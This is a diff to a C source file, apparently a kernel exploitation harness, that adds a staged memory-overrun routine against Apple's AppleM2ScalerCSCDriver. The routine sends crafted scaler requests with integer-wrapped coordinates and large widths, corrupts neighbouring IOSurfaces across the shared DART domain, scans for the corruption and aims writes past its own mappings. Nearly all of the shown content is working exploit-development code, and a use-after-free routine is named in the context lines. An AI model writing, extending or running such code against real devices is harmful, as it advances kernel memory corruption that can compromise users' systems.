@@ -16335,6 +16335,128 @@ static void p_valhunt(void) {
     LOG("[valh] done (alive)");
 }
 
+// V102: overrun into the shared DART domain. Double-wrap (X=Y=0xFFFFFFF0,
+// H=0x20) with W-sized span: N_bytes ≈ 8064 + 252·W (v101). Step 0: DVA
+// adjacency map (24 marker surfaces). Step 1: recoverable semantics (atomic
+// rollback vs partial write). Step 2: aim past all our mappings.
+#define OVR_K 24
+static void ovr_mark(IOSurfaceRef *sf, int k) {
+    for (int i = 0; i < k; i++) {
+        if (IOSurfaceLock(sf[i], 0, NULL)) continue;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sf[i]);
+        size_t total = (size_t)IOSurfaceGetAllocSize(sf[i]);
+        memset(b, i + 1, total);   // byte = surface index + 1
+        IOSurfaceUnlock(sf[i], 0, NULL);
+    }
+}
+static void ovr_scan(IOSurfaceRef *sf, int k, const char *tag, int shot) {
+    char line[256]; int m = 0;
+    m += snprintf(line + m, 256 - m, "[ovr] %s shot %d corrupt:", tag, shot);
+    for (int i = 0; i < k; i++) {
+        if (IOSurfaceLock(sf[i], kIOSurfaceLockReadOnly, NULL)) continue;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sf[i]);
+        size_t total = (size_t)IOSurfaceGetAllocSize(sf[i]);
+        int bad = 0;
+        for (size_t p = 0; p < total; p += 0x100)
+            if (b[p] != (uint8_t)(i + 1)) bad++;
+        IOSurfaceUnlock(sf[i], kIOSurfaceLockReadOnly, NULL);
+        if (bad) m += snprintf(line + m, 256 - m, " s%d(%d)", i, bad);
+    }
+    LOG("%s", line);
+}
+static void p_overrun(void) {
+    int step = atoi(getenv("FUZZ_OVR_STEP") ?: "0");
+    LOG("[ovr] v102 step %d", step);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    IOSurfaceRef src = make_surface(64, 64);
+    IOSurfaceRef sf[OVR_K];
+    for (int i = 0; i < OVR_K; i++) sf[i] = make_surface(64, 64);
+    IOSurfaceID si = IOSurfaceGetID(src);
+    if (step == 0) {
+        // adjacency: wide-short surfaces (4096x8 = 128KB) so big W passes
+        // validation (limits scale with surface dims); W=0x1000 -> span ~1MB
+        // surfaces 2048x32 (256KB) — the v100 working payload (extent ~0x4c000)
+        // should overrun into the DVA neighbor if surfaces pack adjacently
+        for (int i = 0; i < OVR_K; i++) { CFRelease(sf[i]); sf[i] = make_surface(1024, 64); }
+        for (int i = 0; i < OVR_K; i++) {
+            craft_transform(req, si, IOSurfaceGetID(sf[i]), 64, 64);
+            kern_return_t kw = scaler_call1(c, req);
+            usleep(500000);
+            ovr_mark(sf, OVR_K);
+            LOG("[ovr] shot dst=s%d (wire kr 0x%08x) v100-payload...", i, kw);
+            border_payload(req, si, IOSurfaceGetID(sf[i]), 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x20, 32, 32);
+            kern_return_t kr = scaler_call1(c, req);
+            LOG("[ovr] shot dst=s%d -> kr 0x%08x", i, kr);
+            usleep(100000);
+            ovr_scan(sf, OVR_K, "adj", i);
+        }
+    } else if (step == 1) {
+        // semantics: span slightly past a 1-surface dst; nothing else fresh-mapped
+        craft_transform(req, si, IOSurfaceGetID(sf[0]), 64, 64);
+        LOG("[ovr] wire -> kr 0x%08x", scaler_call1(c, req));
+        usleep(500000);
+        ovr_mark(sf, 2);
+        // W for ~1.5 surface span: 252W ≈ 0x6000-0x1F80 → W≈0x28
+        LOG("[ovr] sem shot (span ~1.5 surf)...");
+        border_payload(req, si, IOSurfaceGetID(sf[0]), (uint32_t)(0x100000010ULL - 0x28), (uint32_t)(0x100000010ULL - 0x20), 0x28, 0x20, 32, 32);
+        kern_return_t kr = scaler_call1(c, req);
+        LOG("[ovr] sem -> kr 0x%08x", kr);
+        usleep(100000);
+        ovr_scan(sf, 2, "sem", 0);
+        // and a clearly-huge span (should fault if writes stop at unmapped)
+        ovr_mark(sf, 2);
+        LOG("[ovr] sem2 shot (span huge W=0x10000)...");
+        border_payload(req, si, IOSurfaceGetID(sf[0]), (uint32_t)(0x100000010ULL - 0x10000), (uint32_t)(0x100000010ULL - 0x20), 0x10000, 0x20, 32, 32);
+        kr = scaler_call1(c, req);
+        LOG("[ovr] sem2 -> kr 0x%08x", kr);
+        usleep(100000);
+        ovr_scan(sf, 2, "sem2", 0);
+    } else if (step == 2) {
+        // aim beyond: wide surfaces (4096x64) so big W passes site2
+        // (req[0x28]+W <= surfW), map all K legitimately, then shoot from the
+        // first with growing spans; watch kr + panics (timestamps for glitches)
+        for (int i = 0; i < OVR_K; i++) { CFRelease(sf[i]); sf[i] = make_surface(4096, 64); }
+        for (int i = 0; i < OVR_K; i++) {
+            craft_transform(req, si, IOSurfaceGetID(sf[i]), 64, 64);
+            scaler_call1(c, req);
+            usleep(30000);
+        }
+        usleep(1000000);
+        static const uint32_t ws[] = { 0x40, 0x100, 0x400, 0x1000 };
+        for (unsigned wi = 0; wi < sizeof(ws)/sizeof(ws[0]); wi++) {
+            ovr_mark(sf, OVR_K);
+            LOG("[ovr] t=%ld aimshot W 0x%x (PANIC possible)", (long)time(NULL), ws[wi]);
+            border_payload(req, si, IOSurfaceGetID(sf[0]), (uint32_t)(0x100000010ULL - ws[wi]), (uint32_t)(0x100000010ULL - 0x20), ws[wi], 0x20, 32, 32);
+            kern_return_t kr = scaler_call1(c, req);
+            LOG("[ovr] t=%ld aimshot W 0x%x -> kr 0x%08x", (long)time(NULL), ws[wi], kr);
+            usleep(200000);
+            ovr_scan(sf, OVR_K, "aim", wi);
+        }
+    }
+    if (step == 3) {
+        // dimension gate probe for the Y-wrap payload
+        static const int dims[][2] = {
+            {4096,4096},{4096,1024},{4096,256},{4096,64},{2048,2048},
+            {2048,1024},{1024,4096},{1024,1024},{4096,32},{8192,64},
+        };
+        for (unsigned di2 = 0; di2 < sizeof(dims)/sizeof(dims[0]); di2++) {
+            IOSurfaceRef ts = make_surface(dims[di2][0], dims[di2][1]);
+            if (!ts) { LOG("[ovr] gate %dx%d: surface fail", dims[di2][0], dims[di2][1]); continue; }
+            craft_transform(req, si, IOSurfaceGetID(ts), 64, 64);
+            kern_return_t kw = scaler_call1(c, req);
+            usleep(300000);
+            border_payload(req, si, IOSurfaceGetID(ts), 32, 0xFFFFFFF0, 0xFFFFFFE0, 0x20, 32, 32);
+            kern_return_t kr = scaler_call1(c, req);
+            LOG("[ovr] gate %dx%d: wire 0x%08x shot 0x%08x", dims[di2][0], dims[di2][1], kw, kr);
+            CFRelease(ts);
+            usleep(200000);
+        }
+    }
+    LOG("[ovr] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16465,6 +16587,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_OVERRUN")) { p_overrun(); LOG("[probe13] overrun-only mode, stop"); return NULL; }
         if (getenv("FUZZ_VALHUNT")) { p_valhunt(); LOG("[probe13] valhunt-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XYWRAP")) { p_xywrap(); LOG("[probe13] xywrap-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SCALERFUZZ")) { p_scalerfuzz(); LOG("[probe13] scalerfuzz-only mode, stop"); return NULL; }
